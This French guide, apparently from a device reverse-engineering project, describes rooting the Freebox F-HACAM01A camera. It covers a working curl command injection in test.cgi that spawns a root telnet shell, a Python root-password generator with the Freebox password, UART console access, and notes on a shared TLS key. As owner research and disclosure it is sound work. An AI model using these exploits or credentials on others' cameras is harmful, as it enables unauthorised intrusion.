<!-- generated-by: gsd-doc-writer -->
# Accès root — Freebox F-HACAM01A

Ce document décrit les deux méthodes pour obtenir un accès root sur la caméra : l'injection de
commande via l'API HTTP (sans modification matérielle) et la console série UART (accès physique).

---

## Méthode 1 : Injection de commande via test.cgi

### Vulnérabilité

L'endpoint `/adm/test.cgi?action=ftp_test` est prévu pour tester une connexion FTP. Le paramètre
`ftp_path` est transmis **sans validation ni échappement** à la fonction `system()` du système
d'exploitation. Les substitutions de commandes shell (`$()`) sont interprétées.

- Processus affecté : `test.cgi` (CGI lié au binaire `test.cgi`)
- Exécution en tant que : `uid=0` (root)
- Authentification requise : oui (HTTP Basic, `freeboxcam:<MOT_DE_PASSE>`)
- Persistance : jusqu'au prochain redémarrage

### Exploitation — ouverture d'un shell Telnet

La commande suivante lance `telnetd` sur le port 23 sans mot de passe, en donnant directement
un shell root.

```bash
curl -u freeboxcam:<MOT_DE_PASSE> \
  "http://<IP>/adm/test.cgi?action=ftp_test\
&ftp_server=127.0.0.1\
&ftp_account=anon\
&ftp_passwd=anon\
&ftp_path=%2F%24(%2Fusr%2Fsbin%2Ftelnetd%20-l%20%2Fbin%2Fsh%20-p%2023%20%26)\
&ftp_port=21\
&ftp_passive=0"
```

Le paramètre `ftp_path` décodé vaut : `/$(/usr/sbin/telnetd -l /bin/sh -p 23 &)`

Connexion au shell :

```bash
nc <IP> 23
# ou
telnet <IP>
```

Vérification :

```
# id
uid=0(root) gid=0(root)
# uname -a
Linux cam01 3.2.7 #1 PREEMPT Thu ... armv5tejl GNU/Linux
```

### Exécution de commandes sans ouvrir Telnet

Si vous souhaitez exécuter une commande ponctuelle sans ouvrir un port persistant :

```bash
# Exemple : récupérer le contenu de /etc/passwd via DNS exfiltration ou via un serveur web local
# Exemple : créer un fichier dans /tmp
curl -u freeboxcam:<MOT_DE_PASSE> \
  "http://<IP>/adm/test.cgi?action=ftp_test\
&ftp_server=127.0.0.1&ftp_account=a&ftp_passwd=a\
&ftp_path=%2F%24(id%20%3E%20%2Ftmp%2Ftest.txt)\
&ftp_port=21&ftp_passive=0"
```

### Reconnexion après redémarrage

Le `telnetd` n'est pas persistant : la caméra ne l'exécute pas au démarrage. Après chaque reboot,
il faut rejouer la commande d'exploitation. Pour une persistance complète, il est nécessaire de
modifier le firmware (voir [Structure du firmware](structure-firmware.md)).

---

## Algorithme du mot de passe root — id2pwd

### Contexte

La caméra possède un compte `root` sur le système Linux (distinct des credentials HTTP). Son mot
de passe est calculé à partir de l'**identifiant vendeur OEM** (`vendor_id`), un entier 16 bits
stocké dans le firmware. Pour la version Freebox, `vendor_id = 0x0062`.

### Table de correspondance (id2pwd)

La table est extraite de `libcgicomm.so`, offset `0x26518`, longueur 80 caractères :

```
ABCDEFGHIJABCDEFqrstuvwxyzqrstuv0123456789012345!@#_+!@#_+!@#_+!0123456789ABCDEF
```

Elle est découpée en 5 groupes de 16 caractères :

| Groupe | Index | Contenu |
|--------|-------|---------|
| 0 | 0–15 | `ABCDEFGHIJABCDEF` |
| 1 | 16–31 | `qrstuvwxyzqrstuv` |
| 2 | 32–47 | `0123456789012345` |
| 3 | 48–63 | `!@#_+!@#_+!@#_+!` |
| 4 | 64–79 | `0123456789ABCDEF` |

### Algorithme

Soit `vendor_id` un entier 16 bits. On extrait ses 4 nibbles hexadécimaux (de poids fort à poids
faible) : `n3 n2 n1 n0`.

Par exemple, pour `vendor_id = 0x0062` : `n3=0, n2=0, n1=6, n0=2`.

Le mot de passe à 8 caractères est construit ainsi :

```
pwd[0] = table[0*16 + n3]
pwd[1] = table[1*16 + n2]
pwd[2] = table[2*16 + n1]
pwd[3] = table[3*16 + n0]
pwd[4] = table[4*16 + n3]
pwd[5] = table[4*16 + n2]
pwd[6] = table[4*16 + n1]
pwd[7] = table[4*16 + n0]
```

### Implémentation Python

```python
TABLE = "ABCDEFGHIJABCDEFqrstuvwxyzqrstuv0123456789012345!@#_+!@#_+!@#_+!0123456789ABCDEF"

def id2pwd(vendor_id: int) -> str:
    n3 = (vendor_id >> 12) & 0xF
    n2 = (vendor_id >>  8) & 0xF
    n1 = (vendor_id >>  4) & 0xF
    n0 = (vendor_id >>  0) & 0xF

    pwd  = TABLE[0*16 + n3]
    pwd += TABLE[1*16 + n2]
    pwd += TABLE[2*16 + n1]
    pwd += TABLE[3*16 + n0]
    pwd += TABLE[4*16 + n3]
    pwd += TABLE[4*16 + n2]
    pwd += TABLE[4*16 + n1]
    pwd += TABLE[4*16 + n0]
    return pwd

# Exemples
print(id2pwd(0x0009))  # → Aq0+0009
print(id2pwd(0x0031))  # → Aq3@0031
print(id2pwd(0x0062))  # → Aq6#0062  ← Freebox F-HACAM01A
```

### Table d'exemples

| vendor_id | Mot de passe root |
|-----------|-------------------|
| `0x0009` | `Aq0+0009` |
| `0x0031` | `Aq3@0031` |
| `0x0062` | `Aq6#0062` |

### Connexion root par mot de passe

Le mot de passe root s'utilise pour se connecter via Telnet (ou UART) avec l'utilisateur `root` :

```bash
telnet <IP>
# login: root
# Password: Aq6#0062
```

---

## Méthode 2 : Console UART (accès physique)

### Prérequis matériel

- Câble ou adaptateur USB-UART 3.3V (CP2102, CH340, FTDI…)
- Pry tool ou petit tournevis plat
- Fils de connexion (breadboard ou sonde fine)

> **Ne connectez jamais la broche VCC de l'adaptateur UART à la caméra — alimentez la caméra via son câble d'alimentation USB.**

### Ouverture du boîtier

Le boîtier est composé d'un **dôme blanc** et d'une **base circulaire**. Ils s'emboîtent par
encliquetage :

1. Insérez un pry tool dans la rainure entre le dôme blanc et la base.
2. Faites le tour du boîtier en dégageant progressivement les clips.
3. Le PCB circulaire (~55 mm de diamètre) est accessible une fois le dôme retiré.

### Localisation des pads UART

Les pads UART se trouvent sur le PCB, **près du connecteur blanc multi-broches** (connecteur
d'alimentation et d'interface). Ils sont généralement étiquetés ou disposés en ligne.

Identification :

| Pad | Méthode d'identification |
|-----|--------------------------|
| GND | Continuité avec la masse du PCB (multimètre, mode continuité) |
| VCC | ~3.3V au démarrage — **NE PAS CONNECTER** |
| TX | Oscille à 115200 baud pendant le boot (observable à l'oscilloscope ou avec l'adaptateur UART en écoute) |
| RX | Pad restant — entrée données vers la caméra |

### Connexion

| Adaptateur UART | Caméra |
|-----------------|--------|
| GND | GND |
| RX | TX (caméra) |
| TX | RX (caméra) |
| VCC | **Non connecté** |

Paramètres de la liaison série :

```
Vitesse    : 115200 baud
Bits data  : 8
Parité     : aucune
Bits stop  : 1
Contrôle   : aucun (8N1)
```

### Connexion depuis Linux/macOS

```bash
# Identifier le port
ls /dev/tty.usbserial-* /dev/ttyUSB*

# Se connecter (remplacer par le bon port)
screen /dev/ttyUSB0 115200
# ou
minicom -D /dev/ttyUSB0 -b 115200
# ou
picocom -b 115200 /dev/ttyUSB0
```

### Séquence de boot et accès root

Au démarrage, la console UART affiche le boot du noyau Linux. À la fin du boot, une invite de
connexion apparaît. Saisissez :

```
login: root
Password: Aq6#0062
```

Le shell root est immédiatement accessible.

---

## Notes de sécurité

### Clé privée Stunnel partagée

Le fichier `/etc/stunnel/stunnel.pem` contient la **clé privée TLS** utilisée pour chiffrer
les communications HTTPS et RTSP sécurisées. Cette clé est **identique sur tous les appareils
Sercomm** partageant ce firmware (RC8310A, RC8221, RC8230 et variantes).

Conséquences :
- Tout le trafic HTTPS vers **n'importe quelle** caméra Sercomm avec ce firmware peut être
  déchiffré par quiconque possède cette clé.
- Un attaquant sur le réseau local peut réaliser une attaque par interception (MITM) sur les
  communications HTTPS vers ces caméras.

**Recommandation :** N'envoyez pas de credentials ou d'informations sensibles via HTTPS vers ces
caméras sur un réseau non fiable.

### Injection de commande (test.cgi)

La vulnérabilité d'injection dans `test.cgi` est une **porte dérobée de facto** dans le firmware.
Elle ne peut pas être corrigée sans modifier le firmware. Sur un réseau local, tout utilisateur
connaissant les credentials HTTP peut obtenir un accès root complet.

**Recommandation :** Isolez la caméra dans un VLAN dédié et limitez l'accès à l'interface
d'administration.
